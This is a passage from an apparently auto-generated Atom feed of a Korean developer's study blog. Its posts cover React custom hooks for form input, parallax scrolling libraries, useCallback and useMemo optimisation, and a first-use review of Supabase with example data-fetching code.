+    <span class="p">...</span><span class="nx">prevData</span><span class="p">,</span>
+    <span class="p">[</span><span class="nx">name</span><span class="p">]:</span> <span class="nx">value</span><span class="p">,</span>
+  <span class="p">}));</span>
+<span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">handleEnterUserData</span> <span class="o">=</span> <span class="k">async </span><span class="p">(</span><span class="nx">event</span><span class="p">:</span> <span class="nx">React</span><span class="p">.</span><span class="nx">MouseEvent</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nx">event</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="k">await</span> <span class="nc">EnterUserData</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`Error: </span><span class="p">${</span><span class="nx">error</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>이것은 제가 작성한 코드입니다.</p>
+
+<p>그런데 문득 생각이 들었습니다. <code class="language-plaintext highlighter-rouge">handleInputChange</code> 함수는 회원가입뿐만 아니라 로그인 페이지에서도 똑같이 쓰일 수 있지 않을까? 사실 이런 생각은 이번이 처음이 아닙니다.</p>
+
+<p>프로젝트를 하다 보면 비슷한 로직의 이벤트 코드가 반복되는 경우가 많습니다. 저 역시 그런 코드를 페이지별로 복붙해서 사용하곤 했죠.</p>
+
+<p>앞서 작성한 포스트에서 <code class="language-plaintext highlighter-rouge">useCallback</code>과 <code class="language-plaintext highlighter-rouge">useMemo</code>를 다루면서 리팩토링에 관심이 생기기 시작했습니다.</p>
+
+<p>이제는 코드의 재사용성과 유지보수성을 높이기 위해 커스텀 훅을 활용해야겠다는 생각을 하게 되었습니다.</p>
+
+<p><br /></p>
+
+<h2 id="그래서-커스텀-훅이-뭔데">그래서 커스텀 훅이 뭔데?</h2>
+
+<p>Custom Hooks는 React에서 반복되는 로직을 재사용하기 위해 사용하는 기능입니다. 공식 문서에서는 이를 다음과 같이 설명합니다:</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"개발을 하다 보면 가끔 상태 관련 로직을 컴포넌트 간에 재사용하고 싶은 경우가 생깁니다.
+
+기존의 방법으로는 higher-order components와 render props가 있었으나, Custom Hook은 컴포넌트 트리에 새로운 컴포넌트를 추가하지 않고도 이 문제를 해결할 수 있습니다."
+</code></pre></div></div>
+
+<p>즉, 커스텀 훅은 반복되는 로직을 쉽게 재사용할 수 있게 해줍니다.</p>
+
+<p>예를 들어, 앞서 언급한 <code class="language-plaintext highlighter-rouge">handleInputChange</code> 함수처럼 여러 컴포넌트에서 동일한 입력 처리를 해야 한다면, 이를 커스텀 훅으로 추출하여 재사용할 수 있습니다.</p>
+
+<p><br /></p>
+
+<h2 id="커스텀-훅-만들기">커스텀 훅 만들기</h2>
+
+<p>간단한 예제로 시작해봅시다. 아래는 입력 필드를 처리하는 로직을 커스텀 훅으로 만든 코드입니다.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="p">{</span> <span class="nx">useState</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">react</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">const</span> <span class="nx">useFormData</span> <span class="o">=</span> <span class="p">(</span><span class="nx">initialState</span> <span class="o">=</span> <span class="p">{})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="p">[</span><span class="nx">formData</span><span class="p">,</span> <span class="nx">setFormData</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="nx">initialState</span><span class="p">);</span>
+
+  <span class="kd">const</span> <span class="nx">handleInputChange</span> <span class="o">=</span> <span class="p">(</span><span class="na">e</span><span class="p">:</span> <span class="nx">React</span><span class="p">.</span><span class="nx">ChangeEvent</span><span class="o">&lt;</span><span class="nx">HTMLInputElement</span><span class="o">&gt;</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="p">{</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">;</span>
+    <span class="nf">setFormData</span><span class="p">((</span><span class="nx">prevData</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">({</span>
+      <span class="p">...</span><span class="nx">prevData</span><span class="p">,</span>
+      <span class="p">[</span><span class="nx">name</span><span class="p">]:</span> <span class="nx">value</span><span class="p">,</span>
+    <span class="p">}));</span>
+  <span class="p">};</span>
+
+  <span class="k">return</span> <span class="p">[</span><span class="nx">formData</span><span class="p">,</span> <span class="nx">handleInputChange</span><span class="p">];</span>
+<span class="p">};</span>
+
+<span class="k">export</span> <span class="k">default</span> <span class="nx">useFormData</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>이 커스텀 훅 <code class="language-plaintext highlighter-rouge">useFormData</code>는 <code class="language-plaintext highlighter-rouge">useState</code>와 <code class="language-plaintext highlighter-rouge">handleInputChange</code> 함수를 한 번에 제공합니다. 이제 이 훅을 사용하여 코드를 간결하게 만들 수 있습니다.</p>
+
+<p><br /></p>
+
+<h3 id="사용-예시">사용 예시</h3>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">React</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">react</span><span class="dl">"</span><span class="p">;</span>
+<span class="k">import</span> <span class="nx">useFormData</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">./useFormData</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">const</span> <span class="nx">SignUpForm</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="p">[</span><span class="nx">formData</span><span class="p">,</span> <span class="nx">handleInputChange</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useFormData</span><span class="p">({</span>
+    <span class="na">email</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+    <span class="na">username</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+    <span class="na">nickname</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+    <span class="na">password</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+  <span class="p">});</span>
+
+  <span class="kd">const</span> <span class="nx">handleSubmit</span> <span class="o">=</span> <span class="k">async </span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">event</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
+    <span class="k">try</span> <span class="p">{</span>
+      <span class="k">await</span> <span class="nf">enterUserData</span><span class="p">(</span><span class="nx">formData</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`Error: </span><span class="p">${</span><span class="nx">error</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">};</span>
+
+  <span class="k">return </span><span class="p">(</span>
+    <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">onSubmit</span><span class="o">=</span><span class="p">{</span><span class="nx">handleSubmit</span><span class="p">}</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">email</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">formData</span><span class="p">.</span><span class="nx">email</span><span class="p">}</span> <span class="nx">onChange</span><span class="o">=</span><span class="p">{</span><span class="nx">handleInputChange</span><span class="p">}</span> <span class="sr">/</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">input</span>
+        <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span>
+        <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">formData</span><span class="p">.</span><span class="nx">username</span><span class="p">}</span>
+        <span class="nx">onChange</span><span class="o">=</span><span class="p">{</span><span class="nx">handleInputChange</span><span class="p">}</span>
+      <span class="sr">/</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">input</span>
+        <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">nickname</span><span class="dl">"</span>
+        <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">formData</span><span class="p">.</span><span class="nx">nickname</span><span class="p">}</span>
+        <span class="nx">onChange</span><span class="o">=</span><span class="p">{</span><span class="nx">handleInputChange</span><span class="p">}</span>
+      <span class="sr">/</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">input</span>
+        <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span>
+        <span class="nx">value</span><span class="o">=</span><span class="p">{</span><span class="nx">formData</span><span class="p">.</span><span class="nx">password</span><span class="p">}</span>
+        <span class="nx">onChange</span><span class="o">=</span><span class="p">{</span><span class="nx">handleInputChange</span><span class="p">}</span>
+      <span class="sr">/</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">submit</span><span class="dl">"</span><span class="o">&gt;</span><span class="nx">Sign</span> <span class="nx">Up</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
+</span>    <span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
+</span>  <span class="p">);</span>
+<span class="p">};</span>
+
+<span class="k">export</span> <span class="k">default</span> <span class="nx">SignUpForm</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>이제 <code class="language-plaintext highlighter-rouge">SignUpForm</code>과 같은 다른 컴포넌트에서도 동일한 입력 처리 로직을 재사용할 수 있습니다. 이처럼 커스텀 훅을 사용하면 코드가 훨씬 더 깔끔해지고 유지보수가 쉬워집니다.</p>
+
+<p><br /></p>
+
+<h3 id="커스텀-훅의-장점">커스텀 훅의 장점</h3>
+
+<ul>
+  <li>코드 재사용성: 동일한 로직을 여러 컴포넌트에서 쉽게 재사용할 수 있습니다.</li>
+  <li>유지보수성: 로직이 한 곳에 모여 있으므로, 변경 사항을 쉽게 관리할 수 있습니다.</li>
+  <li>가독성: 복잡한 로직을 훅으로 분리하면 컴포넌트 코드가 훨씬 더 간결해집니다.</li>
+</ul>
+
+<h3 id="주의사항">주의사항</h3>
+
+<ul>
+  <li>의존성 관리: 커스텀 훅 내에서 <code class="language-plaintext highlighter-rouge">useEffect</code> 또는 <code class="language-plaintext highlighter-rouge">useCallback</code>을 사용할 때는 의존성 배열을 정확하게 관리해야 합니다. 그렇지 않으면 예기치 않은 버그가 발생할 수 있습니다.</li>
+  <li>성능: 커스텀 훅이 너무 많아지면 오히려 성능에 부정적인 영향을 줄 수 있으므로, 적절히 사용해야 합니다.</li>
+</ul>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="React" /><summary type="html"><![CDATA[Custom Hook에 대해서 알아보고 기록합니다.]]></summary></entry><entry><title type="html">Parallax? 그게 뭔데</title><link href="http://localhost:4000/study/etc/2023-12-03-parallax/" rel="alternate" type="text/html" title="Parallax? 그게 뭔데" /><published>2023-12-03T00:00:00+09:00</published><updated>2024-08-20T08:18:03+09:00</updated><id>http://localhost:4000/study/etc/parallax</id><content type="html" xml:base="http://localhost:4000/study/etc/2023-12-03-parallax/"><![CDATA[<p>최근 Parallax website가 관심이 많다. 꾸미기에 따라서 정말 사용자에게 좋은 경험을 가능하게 하기 떄문이다. (그냥 이쁘고 멋지기도 하다.)
+이것 말고도 three.js등 관심은 많지만 아직 신출내기 개발자 지망생은 하늘의 별따기다. 그래도 Parallax정도는 꼭 프로젝트에 한번쯤 구현해보고 싶어서 이렇게 정리글을 쓰게 되었다.</p>
+
+<p>Parallax는 먼저 <strong>시차</strong>라는 뜻이다.
+Parallax scrolling effect(시차 스크롤 효과)는 즉,웹사이트의 배경이 전경보다 느린 속도로 스크롤 되는 기술이다.</p>
+
+<h1 id="사용방법에-대해서">사용방법에 대해서</h1>
+
+<p>얼마전에 들었던 강의에서는 마우스이벤트나 키보드등에 따라서 여러 애니메이션에 관한 강의가 있었는데, 그 중에 Parallax에 대한 부분도 있었다.
+그래서 꼭 이번 프로젝트에 써보자! 라는 생각으로 정보를 찾던중, 리액트에서는 대체 어떻게 만들어야 하는거지..?? 라는 생각이 스쳐지나갔다.</p>
+
+<p>먼저 방법을 설명하자면, 내가 찾아본 가장 좋은 방법은 라이브러리를 이용하는 방법이다.</p>
+
+<p>특히 애니메이션에 특화된 라이브러리가 많은데, 그중 <strong>react spring</strong>이라는 라이브러리에서 Parallax를 지원한다고 한다.</p>
+
+<p>이런식으로 컨테이너 형식으로 쓰이는것같다.</p>
+
+<p>그 외에는 react-Parallax가 있는데,</p>
+
+<p>사용법 자체는 위의 react spring과 크게 다를건 없어보인다.</p>
+
+<p>‘생활코딩’이라는 유튜버가 올려놓은 강의가 있으니 참고해야겠다.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="etc" /><summary type="html"><![CDATA[Supabase에 대한 간단한 정보와 사용후기를 기록합니다.]]></summary></entry><entry><title type="html">React 최적화: useCallback과 useMemo</title><link href="http://localhost:4000/study/react/2023-12-01-useCallbackuseMemo/" rel="alternate" type="text/html" title="React 최적화: useCallback과 useMemo" /><published>2023-12-01T00:00:00+09:00</published><updated>2024-08-19T16:44:27+09:00</updated><id>http://localhost:4000/study/react/useCallbackuseMemo</id><content type="html" xml:base="http://localhost:4000/study/react/2023-12-01-useCallbackuseMemo/"><![CDATA[<h2 id="개요">개요</h2>
+
+<p>리액트를 시작한 지 오래되지 않았지만, 이제 초보운전 면허 딱지는 때도 될 정도는 아닌가 하는 생각이 듭니다.</p>
+
+<p>어느 정도 그럴싸한 기능들을 구현하고 페이지를 구현하는 능력을 가지게 되었습니다.</p>
+
+<p>하지만 큰 벽이 기다리고 있었으니, 그것은 바로 ‘최적화’입니다!</p>
+
+<p>좋은 개발자는 번뜩이는 아이디어가 있으면 먼저 그 기능들에 많은 힘을 쏟아서 만들지만, 이제 그만큼의 시간을 공들여서 코드를 정리하고 최적화 작업을 함께 해야 합니다.</p>
+
+<p>자주 사용되는 함수를 따로 빼고, 리렌더를 막아주는 등의 작업은 좋은 웹페이지를 만들고 사용자에게 좋은 경험을 주기 위해 필수적입니다.</p>
+
+<p><br /></p>
+
+<h2 id="최적화의-필요성">최적화의 필요성</h2>
+
+<p>리액트 애플리케이션에서 최적화는 성능 향상과 사용자 경험 개선을 위해 필수적입니다.</p>
+
+<p>예를 들어, 부모 컴포넌트가 리렌더링되면 자식 컴포넌트들도 함께 리렌더링될 수 있습니다.</p>
+
+<p>이로 인해 불필요한 리렌더링이 발생하고, 이는 성능 저하를 초래할 수 있습니다.</p>
+
+<p><br /></p>
+
+<h2 id="usecallback--usememo에-대해">useCallback &amp; useMemo에 대해</h2>
+
+<p>리액트에서 최적화를 위해 자주 사용되는 두 가지 훅은 useCallback과 useMemo입니다.</p>
+
+<p>이들 훅을 적절히 사용하면 불필요한 렌더링을 방지하고 성능을 개선할 수 있습니다.</p>
+
+<p><br /></p>
+
+<h3 id="memoization">Memoization</h3>
+
+<p>먼저 메모이제이션(Memoization)이라는 개념에 대해 이해할 필요가 있습니다.</p>
+
+<p>메모이제이션은 기존에 수행한 연산의 결과를 저장해두고 동일한 입력이 들어오면 저장된 결과를 재활용하는 프로그래밍 기법입니다.</p>
+
+<p>이를 통해 중복 연산을 피하고 애플리케이션의 성능을 최적화할 수 있습니다.</p>
+
+<p><br /></p>
+
+<h3 id="usememo">useMemo</h3>
+
+<p><code class="language-plaintext highlighter-rouge">useMemo</code>는 메모이제이션을 사용하여 값을 반환하는 훅입니다. 사용법은 다음과 같습니다:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">memoizedValue</span> <span class="o">=</span> <span class="nf">useMemo</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="nf">computeExpensiveValue</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">),</span> <span class="p">[</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>여기서 <code class="language-plaintext highlighter-rouge">computeExpensiveValue</code>는 비싼 계산을 수행하는 함수입니다. a와 b가 변경되지 않는 한, <code class="language-plaintext highlighter-rouge">memoizedValue</code>는 이전의 계산 결과를 재사용합니다.</p>
+
+<p><strong>주요 포인트:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">useMemo</code>는 주어진 의존성 배열([a, b])이 변경되지 않는 한, 메모이제이션된 값을 반환합니다.</li>
+  <li>이 훅은 렌더링 성능을 최적화하는 데 도움이 되지만, 너무 많이 사용하면 오히려 성능이 저하될 수 있습니다. 필요한 경우에만 사용하는 것이 좋습니다.</li>
+</ul>
+
+<p><br /></p>
+
+<h3 id="usecallback">useCallback</h3>
+
+<p><code class="language-plaintext highlighter-rouge">useCallback</code>은 메모이제이션을 사용하여 함수를 반환하는 훅입니다. 사용법은 다음과 같습니다:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">memoizedCallback</span> <span class="o">=</span> <span class="nf">useCallback</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="nf">handleSomething</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">);</span>
+<span class="p">},</span> <span class="p">[</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>여기서 <code class="language-plaintext highlighter-rouge">handleSomething</code> 함수는 a와 b가 변경될 때만 새로운 함수를 생성합니다.</p>
+
+<p><strong>주요 포인트:</strong></p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">useCallback</code>은 주어진 의존성 배열([a, b])이 변경되지 않는 한, 같은 함수 인스턴스를 반환합니다.</li>
+  <li>함수가 자식 컴포넌트에 props로 전달될 때, <code class="language-plaintext highlighter-rouge">useCallback</code>을 사용하면 자식 컴포넌트의 불필요한 리렌더링을 방지할 수 있습니다.</li>
+</ul>
+
+<p><br /></p>
+
+<h4 id="예제">예제</h4>
+
+<p>다음은 <code class="language-plaintext highlighter-rouge">useMemo</code>와 <code class="language-plaintext highlighter-rouge">useCallback</code>을 사용하는 간단한 예제입니다:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="nx">React</span><span class="p">,</span> <span class="p">{</span> <span class="nx">useState</span><span class="p">,</span> <span class="nx">useMemo</span><span class="p">,</span> <span class="nx">useCallback</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">react</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="kd">const</span> <span class="nx">ExpensiveComponent</span> <span class="o">=</span> <span class="p">({</span> <span class="nx">computeValue</span> <span class="p">})</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span><span class="nx">Computed</span> <span class="na">Value</span><span class="p">:</span> <span class="p">{</span><span class="nf">computeValue</span><span class="p">()}</span><span class="o">&lt;</span><span class="sr">/div&gt;</span><span class="err">;
+</span><span class="p">};</span>
+
+<span class="kd">const</span> <span class="nx">ParentComponent</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="p">[</span><span class="nx">count</span><span class="p">,</span> <span class="nx">setCount</span><span class="p">]</span> <span class="o">=</span> <span class="nf">useState</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+  <span class="kd">const</span> <span class="nx">computeExpensiveValue</span> <span class="o">=</span> <span class="nf">useCallback</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="c1">// Expensive computation</span>
+    <span class="k">return</span> <span class="nx">count</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
+  <span class="p">},</span> <span class="p">[</span><span class="nx">count</span><span class="p">]);</span>
+
+  <span class="kd">const</span> <span class="nx">memoizedValue</span> <span class="o">=</span> <span class="nf">useMemo</span><span class="p">(</span>
+    <span class="p">()</span> <span class="o">=&gt;</span> <span class="nf">computeExpensiveValue</span><span class="p">(),</span>
+    <span class="p">[</span><span class="nx">computeExpensiveValue</span><span class="p">]</span>
+  <span class="p">);</span>
+
+  <span class="k">return </span><span class="p">(</span>
+    <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span>
+      <span class="o">&lt;</span><span class="nx">button</span> <span class="nx">onClick</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="nf">setCount</span><span class="p">(</span><span class="nx">count</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)}</span><span class="o">&gt;</span><span class="nx">Increment</span><span class="o">&lt;</span><span class="sr">/button</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">ExpensiveComponent</span> <span class="nx">computeValue</span><span class="o">=</span><span class="p">{</span><span class="nx">computeExpensiveValue</span><span class="p">}</span> <span class="sr">/</span><span class="err">&gt;
+</span>      <span class="o">&lt;</span><span class="nx">div</span><span class="o">&gt;</span><span class="nx">Memoized</span> <span class="na">Value</span><span class="p">:</span> <span class="p">{</span><span class="nx">memoizedValue</span><span class="p">}</span><span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
+</span>    <span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
+</span>  <span class="p">);</span>
+<span class="p">};</span>
+
+<span class="k">export</span> <span class="k">default</span> <span class="nx">ParentComponent</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>이 예제에서 <code class="language-plaintext highlighter-rouge">computeExpensiveValue</code>는 count가 변경될 때만 재계산됩니다.</p>
+
+<p><code class="language-plaintext highlighter-rouge">ExpensiveComponent</code>는 동일한 함수 참조를 받기 때문에, 자식 컴포넌트의 불필요한 리렌더링이 방지됩니다.</p>
+
+<p><br /></p>
+
+<h3 id="결론">결론</h3>
+
+<p><code class="language-plaintext highlighter-rouge">useCallback</code>과 <code class="language-plaintext highlighter-rouge">useMemo</code>는 리액트 애플리케이션에서 성능 최적화를 위해 유용한 도구입니다.</p>
+
+<p><code class="language-plaintext highlighter-rouge">useCallback</code>은 함수의 메모이제이션을, <code class="language-plaintext highlighter-rouge">useMemo</code>는 값의 메모이제이션을 도와줍니다. 이 훅들을 적절하게 활용하면 성능을 개선하고 사용자 경험을 향상시킬 수 있습니다.</p>
+
+<p>하지만, 이러한 최적화는 남용하지 않도록 주의하며 필요에 따라 적절히 사용하는 것이 중요합니다.</p>]]></content><author><name>Lee Ho</name><email>bomlang4211@gmail.com</email></author><category term="study" /><category term="React" /><summary type="html"><![CDATA['React의 Hooks, useCallback과 useMemo에 대해서 공부하고 기록합니다.]]></summary></entry><entry><title type="html">Supabase 사용후기</title><link href="http://localhost:4000/project/2023-11-23-supabase/" rel="alternate" type="text/html" title="Supabase 사용후기" /><published>2023-11-23T00:00:00+09:00</published><updated>2024-08-19T16:21:21+09:00</updated><id>http://localhost:4000/project/supabase</id><content type="html" xml:base="http://localhost:4000/project/2023-11-23-supabase/"><![CDATA[<h2 id="supabase-소개">Supabase 소개</h2>
+
+<p>Supabase는 오픈 소스 Firebase 대안으로, PostgreSQL을 기반으로 한 백엔드 서비스입니다. 데이터베이스, 인증, 스토리지, 실시간 기능 등을 제공하여 개발자들이 빠르게 애플리케이션을 개발할 수 있도록 돕습니다.</p>
+
+<h2 id="supabase를-알게-된-경로">Supabase를 알게 된 경로</h2>
+
+<p>저는 유튜브의 ‘노마드코더’ 채널을 구독하며 최신 개발 소식을 접하고 있었습니다. Supabase에 대해 알게 된 것은 이러한 채널에서의 소개 덕분이었습니다.</p>
+
+<p>프론트엔드를 공부하면서 작은 사이드 프로젝트나 포트폴리오를 만드는데 백엔드 데이터베이스가 필요했고, 주변에 백엔드 전문가가 없어 대체할 무언가를 찾아야 했습니다.</p>
+
+<p>이전에 멋사 6기 프론트엔드 스쿨에서 React 학습을 하면서 PocketBase를 사용해본 경험이 있었는데, 이도 꽤 유용한 도구였습니다.</p>
+
+<h2 id="사용해보고-느낀-점">사용해보고 느낀 점</h2>
+
+<p>멋쟁이 사자처럼 플러스과정에서 리액트 프로젝트 과제를 진행하면서 Supabase를 사용하게 되었습니다.</p>
+
+<p>과제에서는 댓글 기능을 구현해야 했고, 강사님께서 Supabase를 추천해 주셨습니다. 사용법을 간단히 알려주셨고, 실제로 사용해보니 API 문서가 상당히 친절하고 사용 방법도 어렵지 않았습니다.</p>
+
+<p>테이블 생성 등 일부는 코드로 처리해야하는 복잡성도 있었지만 이것은 선택의 영역일 뿐이고 코드없이도 테이블생성에 문제가 없었으며, 전반적으로 사용자 경험이 좋았습니다.</p>
+
+<p>특히 다음과 같은 코드로 데이터를 가져오는 것이 가능했습니다:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="p">{</span> <span class="nx">createClient</span> <span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">@supabase/supabase-js</span><span class="dl">"</span><span class="p">;</span>
+
+<span class="k">export</span> <span class="kd">const</span> <span class="nx">readComment</span> <span class="o">=</span> <span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="p">{</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">error</span> <span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">supabaseAdmin</span>
+      <span class="p">.</span><span class="k">from</span><span class="p">(</span><span class="dl">"</span><span class="s2">video_comment</span><span class="dl">"</span><span class="p">)</span>
+      <span class="p">.</span><span class="nf">select</span><span class="p">(</span><span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">);</span>
+
+    <span class="k">if </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`데이터 통신에 실패하였습니다..😵‍💫 </span><span class="p">${</span><span class="nx">error</span><span class="p">.</span><span class="nx">message</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">data</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="s2">`데이터 통신에 실패하였습니다..😵‍💫 </span><span class="p">${</span><span class="nx">error</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+    <span class="k">throw</span> <span class="nx">error</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>현재는 기본적인 기능만 사용해봤기 때문에, Supabase의 다양한 부가기능을 더 경험해봐야 전체적인 평가를 내릴 수 있을 것 같습니다.</p>
+
+<h2 id="supabase의-장점">Supabase의 장점</h2>
+
+<p>Supabase에 대해서 좀 더 알아보기 위해서 장점과 단점을 살펴보겠습니다.</p>
+
+<p>먼저 장점으로는,</p>
+
+<ul>
+  <li>
+    <p>오픈 소스: Supabase는 오픈 소스 프로젝트로, 커스터마이징과 자가 호스팅이 가능합니다. 코드가 공개되어 있어 투명성이 높습니다.</p>
+  </li>
+  <li>
+    <p>PostgreSQL 기반: 안정성과 성능이 뛰어난 PostgreSQL을 데이터베이스로 사용하여 강력한 쿼리 기능과 ACID 트랜잭션을 제공합니다.</p>
+  </li>
+  <li>
+    <p>통합된 기능: 데이터베이스, 인증, 스토리지, 실시간 기능을 통합하여 별도의 서비스와 통합 없이 모든 기능을 하나의 플랫폼에서 관리할 수 있습니다.</p>
+  </li>
+  <li>
+    <p>친절한 문서화: API 문서와 가이드는 친절하게 작성되어 있어 사용자가 쉽게 접근하고 이해할 수 있습니다.</p>
+  </li>
+  <li>
+    <p>실시간 기능: 데이터베이스의 실시간 업데이트를 지원하여 채팅, 알림 등의 실시간 기능을 쉽게 구현할 수 있습니다.</p>
+  </li>
+  <li>
+    <p>간편한 설정: Supabase CLI와 UI를 통해 빠르게 프로젝트를 설정하고 관리할 수 있습니다.</p>
+  </li>
+</ul>
+
+<p>등이 있습니다.</p>
+
+<h2 id="supabase의-단점">Supabase의 단점</h2>
+
+<ul>
+  <li>
+    <p>새로운 서비스: Supabase는 비교적 새로운 서비스로, 일부 기능이 아직 성숙하지 않았거나 Firebase와 같은 대안에 비해 부족할 수 있습니다.</p>
+  </li>
+  <li>
+    <p>성능 문제: 특정 사용 사례나 쿼리에서는 성능 이슈가 발생할 수 있으며, 이는 PostgreSQL 자체의 한계나 Supabase의 설정에 따라 다를 수 있습니다.</p>
+  </li>
+  <li>
